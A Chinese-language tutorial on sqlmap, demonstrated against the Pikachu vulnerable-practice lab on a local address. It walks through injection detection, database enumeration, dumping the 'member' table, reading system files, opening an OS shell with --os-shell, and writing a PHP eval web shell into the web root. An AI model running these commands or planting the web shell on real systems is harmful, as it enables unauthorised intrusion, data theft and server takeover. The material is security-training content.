# sqlmap使用

## 简介

[sqlmap](https://sqlmap.org/) 是一种开源渗透测试工具，可自动执行检测和利用 SQL 
注入缺陷以及接管数据库服务器的过程。它配备了一个强大的检测引擎、终极渗透测试器的许多利基功能以及广泛的开关，从数据库指纹识别、从数据库获取数据，到访问底层文件系统和通过带外连接在操作系统上执行命令

## 用法

### 获取帮助文档

```
sqlmap -h
```

<details>
  <summary>点我展开</summary>
  <pre><code>
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
-h, --help            Show basic help message and exit
-hh                   Show advanced help message and exit
--version             Show program's version number and exit
-v VERBOSE            Verbosity level: 0-6 (default 1)

Target:
At least one of these options has to be provided to define the
target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

Request:
These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

Injection:
These options can be used to specify which parameters to test for,
provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

Detection:
These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

Techniques:
These options can be used to tweak testing of specific SQL injection
techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

Enumeration:
These options can be used to enumerate the back-end database
management system information, structure and data contained in the
tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

Operating system access:
These options can be used to access the back-end database management
system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

General:
These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

Miscellaneous:
These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users

[!] to see full list of options run with '-hh'

  </code></pre>
</details>

### pikachu数字注入post请求

将抓包的内容放在一个文件里，如`number.txt`

<details>
  <summary>点我展开</summary>
  <pre><code>
POST /pikachu/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.1.2
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.2/pikachu/vul/sqli/sqli_id.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=ceqfckeafjbpl03t4jck0vfrh7
Connection: keep-alive

id=1&submit=%E6%9F%A5%E8%AF%A2

</code></pre>
</details>

sqlmap执行如下的命令
```
-- 是否有注入点
sqlmap -r number.txt
```

### 获取信息

#### 数据库信

```
sqlmap -r number.txt --dbs          #获取所有数据库名
sqlmap -r number.txt --current-user #当前用户
sqlmap -r number.txt --current-db   #当前连接的数据库
sqlmap -r number.txt --is-dba       #判断是否为管理
sqlmap -r number.txt --users        #数据库所有用户
```

#### 获取表信息

表名

格式： sqlmap -r number.txt --tables -D 数据库名
```
sqlmap -r number.txt --tables -D pikachu
```

#### 字段名

格式： sqlmap -r number.txt --columns -T 表名 -D 数据库名
```
sqlmap -r number.txt --columns -T member -D pikachu
```

#### 获取表中的数据

格式： sqlmap -r number.txt [-C 列1,列2...] -T 表名 -D 数据库名
```
sqlmap -r number.txt -T member -D pikachu --dump
```

#### 获取系统中的文件

```
sqlmap -r number.txt --file-read C:/Windows/System32/drivers/etc/hosts
```

## --os-shell

**获取shell**

前提

- 知道php服务器的目录
- 数据库开启了`secure_file_priv`配置

```
sqlmap -r number.txt --os-shell
```

```
输入web server language，这里是pikachu项目，输入php对应的数字：4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] **：回车**

what do you want to use for writable directory? （可写如的文件夹，这个需要知道服务的根目录，选择自定义2）

please provide a comma separate list of absolute directory paths: **C:\\software\\phpstudy_pro\\WWW**

you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header 
which intersect with yours. Do you want to merge them in further requests? [Y/n] **：回车** 

os-shell> **（到这里就进去了系统的shell）**
```
可以看到在根目录下有两个上传的文件：`tmpupivz.php`，`tmpbjdzz.php`.

可以使用简单的命令`notepad`,`calc`,`dir`等测试一下。

**获取shell的第二种方式**

假设写好了test.php是一个shell脚本，内容如下：
```php
<?php @eval($_POST['qwert']);?>
```

那么可以通过以下命令来写入shell。
```
sqlmap -r number.txt --file-write "test.php" --file-dest "C:\\software\\phpstudy_pro\\WWW\\test.php" -v 1
```

如果写入成功，可以尝试使用通过[蚁剑](https://github.com/AntSwordProject/antSword)连接。